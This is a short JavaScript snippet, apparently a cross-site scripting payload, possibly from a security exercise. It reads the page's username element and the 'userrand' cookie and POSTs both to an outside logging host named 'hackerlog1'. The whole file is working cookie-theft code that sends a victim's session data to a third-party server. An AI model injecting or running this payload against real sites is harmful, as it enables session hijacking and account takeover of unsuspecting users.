function getCookie(cname) {
  let name = cname + '=';
  let ca = document.cookie.split(';');
  for (let i = 0; i < ca.length; i++) {
    let c = ca[i];
    while (c.charAt(0) == ' ') {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) {
      return c.substring(name.length, c.length);
    }
  }
  return '';
}

let key = document.getElementsByClassName('username')[0].innerText;
let value = getCookie('userrand');


var xhttp = new XMLHttpRequest();
var url = 'https://hackerlog1.vikaa.fi/logs';
var data = new FormData();
data.append('key', key);
data.append('value', value);
xhttp.open('POST', url, true);
xhttp.send(data);
xhttp.onload = function() {
  alert(this.responseText);
};